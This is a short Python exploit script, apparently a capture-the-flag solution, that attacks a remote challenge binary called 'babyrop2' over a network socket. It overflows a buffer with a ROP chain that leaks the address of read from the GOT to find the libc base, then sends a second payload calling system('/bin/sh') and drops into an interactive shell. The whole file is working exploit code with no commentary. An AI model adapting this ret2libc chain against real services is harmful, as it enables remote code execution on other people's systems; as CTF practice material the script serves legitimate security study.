from ptrlib import *

libc = ELF("./libc.so.6")
elf = ELF("./babyrop2")
#sock = Process("./babyrop2")
sock = Socket("problem.harekaze.com", 20005)

plt_printf = 0x4004f0
rop_pop_rdi = 0x00400733
rop_pop_rsi_r15 = 0x00400731

payload = b'A' * 0x28
payload += p64(rop_pop_rdi)
payload += p64(elf.got("read"))
payload += p64(plt_printf)
payload += p64(elf.symbol("main"))
sock.recvuntil("name? ")
sock.send(payload)
sock.recvline()
addr = sock.recvuntil("What")[:-4]
libc_base = u64(addr) - libc.symbol("read")

dump("libc base = " + hex(libc_base))

sock.recvuntil("name? ")
sock.send(payload)
payload = b'A' * 0x28
payload += p64(rop_pop_rdi)
payload += p64(libc_base + next(libc.find("/bin/sh")))
payload += p64(libc_base + libc.symbol("system"))
sock.send(payload)

sock.interactive()
